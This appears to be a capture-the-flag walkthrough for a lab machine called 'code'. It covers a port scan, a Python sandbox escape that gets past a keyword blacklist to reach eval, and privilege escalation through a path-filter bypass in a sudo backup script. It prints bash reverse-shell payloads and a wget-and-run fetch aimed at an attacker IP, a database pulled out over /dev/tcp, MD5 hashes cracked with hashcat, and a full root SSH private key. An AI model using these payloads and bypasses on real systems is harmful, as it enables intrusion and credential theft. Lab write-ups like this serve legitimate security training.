# Reconnaissance
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.62
nmap -sU --top-ports=10 -vv 10.10.11.62

---OUTPUT-TCP---
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Python Code Editor
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---OUTPUT-UDP---
n/a
```
----
## Initial Foothold - Python SandBox Bypass
- On port 5000 we get an interactive python sandbox where e can execute commands
	- Some commands are blacklisted
- I try to see if python3 or 2 :
	- `print "Hello"` fails so probably python3
- Certain keywords are blacklisted:
	- os
	- system
	- eval
	- exec
	- import
- if I do `print("import")` it fails with blacklisted string error
	- but if I do `print('imp'+'ort')` i get `import` as output
		- + can be used to bypass
			- However we can't just pass commands with quotes as they become strings and no commands.
- https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/sandbox/python-sandbox-escape.md
	- talks how we can use `().__class__.__bases__[0].__subclasses__()` to call dangerous functions
	- also talks about how we ca use `__builtins__` function to bypass commands banned.
	- also in the last section shows how we can use + to bypass some keywords that are blacklisted
- https://github.com/b4rdia/HackTricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
	- also talks about how we can abuse the `''.__class__.__bases__[0].__subclasses__()`
- To explain step by step lets just take an example of a value x assigned a string value of nothing i.e `x=''`
	- `''.__class__` : I take the string '' and get its class → str.
	- `.__bases__[0]` : I take the parent (base class) of str → which is object.
		- (bases is a tuple, but `[0]` picks the object class.)
	- `.__subclasses__()` : I list ALL subclasses of object.
		- These subclasses are things like list, dict, function, type, etc.
		- I now have access to a huge list of Python's core classes.
	- Loop through each subclass, and access their `__init__` method.
		- `__init__` is the constructor method (used when you create an instance).
		- In Python, `__init__` is just a function!
	- And functions in Python have a special attribute: __globals__.
		- `.__globals__` of the `__init__` function
		- `__globals__` shows the full global environment where that function was created.
	- In that environment, there's usually a dictionary called `__builtins__`.
	- We check inside `__builtins__` for eval.
		- eval allows you to execute any string as Python code.
	- Use eval to import os and call system to execute a shell command.
		- Even if import is blacklisted directly, you build it manually with `'__imp'+'ort__'`.
		- For `os` in import("os") it would require " at the end instead of ' like `'__imp'+'ort__("o'+'s")'`

- First to see if the above explanation is actually seen:
	```bash
x=''.__class__
print(x)
----
x=''.__class__.__bases__
print(x)
----
x=''.__class__.__bases__[0].__subclasses__()
print(x)


---OUTPUTS---

--1--
<class 'str'>

--2--
(<class 'object'>,)

---3---
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class
...
...
...
Too big
```
- From here we create a loop to access `__init__.__globals__` and search for the `__builtin__` dictionary to find the eval function..
	- And if it finds the eval, function it executes out code.
		```bash
x = ''.__class__.__bases__[0].__subclasses__()
for i in range(len(x)):
    try:
        g = x[i].__init__.__globals__
        if g and '__buil'+'tins__' in g:
            e = g['__buil'+'tins__']['ev'+'al']
            e('__imp'+'ort__("o'+'s").sy'+'stem("bash -c \'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1\'")')
            break
    except:
        pass
```
		- Note the `\` between `bash -c` and `'bash -i` aswell as after `1`
			- without it `'` would close the string and not take the remaining argument.
- To further understand the above loop, let's try to find which subclass location has eval first and then we can pass a simply command like ls to see it's output.
	- To find subclass locations with eval:
		```bash
x = ''.__class__.__bases__[0].__subclasses__() 
for i in range(len(x)):
    try:
        g = x[i].__init__.__globals__  
        if g and '__bui'+'ltins__' in g:  
            if 'ev'+'al' in g['__bui'+'ltins__']: 
                print(i)
    except Exception as ex:
        pass  

---OUTPUT---
80 81 82 83 99 100 101 103 104 105 107 108 109 110 132 133 134 136 137 138 139 166 174 175 176 178 179 185 186 187 188 189 192 193 194 195 196 197 198 199 206 207 208 209 210 211 212 214 215 216 222 223 224 225 226 227 228 230 231 232 248 249 250 251 252 253 254 255 256 257 259 260 261 262 263 264 265 266 269 270 271 272 273 274 275 276 277 282 283 284 285 287 288 289 290 291 293 295 296 297 299 300 301 302 304 305 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 332 333 334 335 336 341 342 343 344 345 346 352 353 354 355 357 358 359 360 364 366 367 368 369 370 371 372 373 374 375 376 377 378 389 390 391 392 393 395 396 400 410 411 413 414 415 416 417 418 419 420 421 422 423 424 427 428 429 430 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 455 456 457 458 459 460 461 463 464 465 466 467 468 469 470 471 472 473 474 475 477 478 479 480 481 485 486 487 488 489 491 495 497 498 499 500 501 502 504 505 506 509 510 511 512 513 514 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 532 533 534 536 538 540 541 543 544 553 560 563 565 566 567 568 569 570 572 573 582 584 585 586 588 589 590 591 592 593 597 598 605 606 610 612 625 626 627 635 638 639 641 643 644 645 646 647 648 649 650 655 660 663 664 667 668 669 671 672 673 674 675 676 678 679 680 681 682 683 685 690 691 692 693 694 695 697 698 699 700 701 702 703 704 709 711 712 713
```
		- Explanation:
			- We sift through the subclasses assigning g to `__init__.__globals__` and check for the `__builtin__` dictionary. 
				- if no `__init__.__globals__` for the sublcass, it will jump to the  `except` case 
				- If it does, it will continue on to the next loop
			- If the `__builtins__` dictionary exists, it assigns, e to `[__builtins__][eval]` 
				- if there is no eval it goes to the `except` case and moves on to the next loop
				- if there is, it will print i
					- i is the subclass number where eval exists.
	- A more cleaner code (remove `break` to see all subclass locations, for now it shows just 1):
		```bash
for i, subclass in enumerate(''.__class__.__bases__[0].__subclasses__()):
    try:
        g = subclass.__init__.__globals__
        if g and '__buil'+'tins__' in g and 'ev'+'al' in g['__buil'+'tins__']:
            print(i)
            break
    except Exception as y:
        pass

---OUTPUT---
80
```
- We can use any of those subclass numbers to pass our eval function:
	```bash
x = ''.__class__.__bases__[0].__subclasses__()[445].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").sy'+'stem("ls /")')
print(x)

---OUTPUT---
0
```
	- I try to pass ls command and get an output 0. This implies the command ran successfully but since system doesn't print output just responds in 0 and 1 we don't really see the / directory.
	- Instead we can use the `popen("<command>").read()` command
		```bash
x=''.__class__.__bases__[0].__subclasses__()[516].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("ls /").re'+'ad()')
print(x)

---OUTPUT---
bin boot dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin srv sys tmp usr var
```
-------
- Alternatively you can write a file and call it (reference: https://www.hyhforever.top/htb-code/)
	- Write the file and host a python server in local machine in that directory with file (`python3 -m http.server 80`)
		```bash
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("wget 10.10.14.25/shell.sh -O /tmp/shell.sh").re'+'ad()'))
 
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("bash /tmp/shell.sh").re'+'ad()'))
```
	- popen seems like a better option as we can capture the output whereas system just responds with 0 and 1
		- So to refine our command
			```bash
x = ''.__class__.__bases__[0].__subclasses__()
for i in range(len(x)):
    try:
        g = x[i].__init__.__globals__
        if g and '__buil'+'tins__' in g:
            e = g['__buil'+'tins__']['ev'+'al']
            e('__imp'+'ort__("o'+'s").po'+'pen("bash -c \'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1\'")')
            break
    except Exception as y:
        continue
```
			- Also removed the read() as there's nothing to read.
- With netcat listening e should catch a reverse shell.
	- can grab user flag
	- Tried to get better shell (using script as well as python3 -c pty.spawn commands...the pyhton3 one made it impossible to use and the script command  gave no noticeable difference.)
------
## Lateral Movement
- In user's folder we find database.db in app>instances folder
- We get it to our local machine :
	```bash
cat database.db > /dev/tcp/10.10.14.25/9998 0>&1

---ON-LOCAL-MACHINE---
nc -lvnp 9998 > database.db
sqlite3 database.db .tables
sqlite3 database.db "select* from user" -cmd ".headers on"

---OUTPUT-TABLES---
code user

---OUTPUT-TABLE-USER---
id|username|password
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```
	- checked the length:
		```bash
echo -n "759b74ce43947f5f4c91aeddc3e5bad3" | wc -c

---OUTPUT---
32
```
		- possible MD5
- Cracked via : https://crackstation.net/ or hashcat (save hash to filename hash)
	```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show 

---OUTPUT---
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
759b74ce43947f5f4c91aeddc3e5bad3:development
```
	- We can ssh into machine (can also do su martin but for a better shell better to ssh)
-----
## Privilege Escalation
- we pass 
	```bash
sudo -l

---OUTPUT---
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
- I pass the command:
	```bash
sudo /usr/bin/backy.sh

---OUTPUT---
Usage: /usr/bin/backy.sh <task.json>
```
- Reading backy.sh
	```bash
cat /usr/bin/backy.sh 


---OUTPUT---
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
	- Checks for string `../` and replaces it with `""`
	- Looks for task.json
		- if it exists, reads `directories_to_archive`
			- directory has to start with `/home` or `/var`
- We create a file task.json :
	```json
{
  "directories_to_archive": ["/home/.../.../..//root/"],
}

--OR--
{
  "directories_to_archive": ["/home/..././root/"],
}
```
	- Pass the command (FAILS)
		```bash
sudo /usr/bin/backy.sh task.json
2025/04/27 22:35:43 🍀 backy 1.2
2025/04/27 22:35:43 📋 Working with task.json ...
2025/04/27 22:35:43 🔰 Task configuration: destination must be specified!
2025/04/27 22:35:43 ❗ Can't read provided task configuration
```
	- I set the destination and try again 
		```json
{
  "directories_to_archive": ["/home/.../.../..//root/"],
  "destination": "/home/martin"
}

---OUTPUT---
2025/04/27 22:36:58 🍀 backy 1.2
2025/04/27 22:36:58 📋 Working with task.json ...
2025/04/27 22:36:58 💤 Nothing to sync
2025/04/27 22:36:58 📤 Archiving: [/home/../root]
2025/04/27 22:36:58 📥 To: /home/martin ...
2025/04/27 22:36:58 📦
```
		- initially i put `["/home/martin"]` and it failed as putting `[]` makes it an array and it needs a string.
		- Cleaner to use `..././` but i initiallu used the above hence that's what is pasted
- We find a zip file and unzip it:
	```bash
tar -xjf code_home_.._root_2025_April.tar.bz2
```
- We navigate to root folder that's been copied to /home/martin and read the root flag
	```bash
cd root
cat root.txt
```
- Can also grab the ssh key file at `.ssh/id_rsa`
	- json file:
		```json
{
  "directories_to_archive": [
    "/home/../root/.ssh/id_rsa"
  ],
  "destination": "/home/martin"
}
```
	- `id_rsa`
		```bash
tar -xjf code_home_.._root_.ssh_id_rsa_2025_April.tar.bz2
cd /root/.ssh/
cat id_rsa

---OUTPUT---
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvxPw90VRJajgkjwxZqXr865V8He/HNHVlhp0CP36OsKSi0DzIZ4K
sqfjTi/WARcxLTe4lkVSVIV25Ly5M6EemWeOKA6vdONP0QUv6F1xj8f4eChrdp7BOhRe0+
zWJna8dYMtuR2K0Cxbdd+qvM7oQLPRelQIyxoR4unh6wOoIf4EL34aEvQDux+3GsFUnT4Y
MNljAsxyVFn3mzR7nUZ8BAH/Y9xV/KuNSPD4SlVqBiUjUKfs2wD3gjLA4ZQZeM5hAJSmVe
ZjpfkQOdE+++H8t2P8qGlobLvboZJ2rghY9CwimX0/g0uHvcpXAc6U8JJqo9U41WzooAi6
TWxWYbdO3mjJhm0sunCio5xTtc44M0nbhkRQBliPngaBYleKdvtGicPJb1LtjtE5lHpy+N
Ps1B4EIx+ZlBVaFbIaqxpqDVDUCv0qpaxIKhx/lKmwXiWEQIie0fXorLDqsjL75M7tY/u/
M7xBuGl+LHGNBnCsvjLvIA6fL99uV+BTKrpHhgV9AAAFgCNrkTMja5EzAAAAB3NzaC1yc2
EAAAGBAL8T8PdFUSWo4JI8MWal6/OuVfB3vxzR1ZYadAj9+jrCkotA8yGeCrKn404v1gEX
MS03uJZFUlSFduS8uTOhHplnjigOr3TjT9EFL+hdcY/H+Hgoa3aewToUXtPs1iZ2vHWDLb
kditAsW3XfqrzO6ECz0XpUCMsaEeLp4esDqCH+BC9+GhL0A7sftxrBVJ0+GDDZYwLMclRZ
95s0e51GfAQB/2PcVfyrjUjw+EpVagYlI1Cn7NsA94IywOGUGXjOYQCUplXmY6X5EDnRPv
vh/Ldj/KhpaGy726GSdq4IWPQsIpl9P4NLh73KVwHOlPCSaqPVONVs6KAIuk1sVmG3Tt5o
yYZtLLpwoqOcU7XOODNJ24ZEUAZYj54GgWJXinb7RonDyW9S7Y7ROZR6cvjT7NQeBCMfmZ
QVWhWyGqsaag1Q1Ar9KqWsSCocf5SpsF4lhECIntH16Kyw6rIy++TO7WP7vzO8Qbhpfixx
jQZwrL4y7yAOny/fblfgUyq6R4YFfQAAAAMBAAEAAAGBAJZPN4UskBMR7+bZVvsqlpwQji
Yl7L7dCimUEadpM0i5+tF0fE37puq3SwYcdzpQZizt4lTDn2pBuy9gjkfg/NMsNRWpx7gp
gIYqkG834rd6VSkgkrizVck8cQRBEI0dZk8CrBss9B+iZSgqlIMGOIl9atHR/UDX9y4LUd
6v97kVu3Eov5YdQjoXTtDLOKahTCJRP6PZ9C4Kv87l0D/+TFxSvfZuQ24J/ZBdjtPasRa4
bDlsf9QfxJQ1HKnW+NqhbSrEamLb5klqMhb30SGQGa6ZMnfF8G6hkiJDts54jsmTxAe7bS
cWnaKGOEZMivCUdCJwjQrwk0TR/FTzzgTOcxZmcbfjRnXU2NtJiaA8DJCb3SKXshXds97i
vmNjdD59Py4nGXDdI8mzRfzRS/3jcsZm11Q5vg7NbLJgiOxw1lCSH+TKl7KFe0CEntGGA9
QqAtSC5JliB2m5dBG7IOUBa8wDDN2qgPN1TR/yQRHkB5JqbBWJwOuOHSu8qIR3FzSiOQAA
AMEApDoMoZR7/CGfdUZyc0hYB36aDEnC8z2TreKxmZLCcJKy7bbFlvUT8UX6yF9djYWLUo
kmSwffuZTjBsizWwAFTnxNfiZWdo/PQaPR3l72S8vA8ARuNzQs92Zmqsrm93zSb4pJFBeJ
9aYtunsOJoTZ1UIQx+bC/UBKNmUObH5B14+J+5ALRzwJDzJw1qmntBkXO7e8+c8HLXnE6W
SbYvkkEDWqCR/JhQp7A4YvdZIxh3Iv+71O6ntYBlfx9TXePa1UAAAAwQD45KcBDrkadARG
vEoxuYsWf+2eNDWa2geQ5Po3NpiBs5NMFgZ+hwbSF7y8fQQwByLKRvrt8inL+uKOxkX0LM
cXRKqjvk+3K6iD9pkBW4rZJfr/JEpJn/rvbi3sTsDlE3CHOpiG7EtXJoTY0OoIByBwZabv
1ZGbv+pyHKU5oWFIDnpGmruOpJqjMTyLhs4K7X+1jMQSwP2snNnTGrObWbzvp1CmAMbnQ9
vBNJQ5xW5lkQ1jrq0H5ugT1YebSNWLCIsAAADBAMSIrGsWU8S2PTF4kSbUwZofjVTy8hCR
lt58R/JCUTIX4VPmqD88CJZE4JUA6rbp5yJRsWsIJY+hgYvHm35LAArJJidQRowtI2/zP6
/DETz6yFAfCSz0wYyB9E7s7otpvU3BIuKMaMKwt0t9yxZc8st0cev3ikGrVa3yLmE02hYW
j6PbYp7f9qvasJPc6T8PGwtybdk0LdluZwAC4x2jn8wjcjb5r8LYOgtYI5KxuzsEY2EyLh
hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
-----END OPENSSH PRIVATE KEY-----
```
	- Copy the file to local machine and set permissions
		```bash
vi root_id_rsa # copy key here
chmod 0600 root_id_rsa
ssh -i root_id_rsa root@10.10.11.62

---OUTPUT---
root@code:~ whoami
root
```
----
----
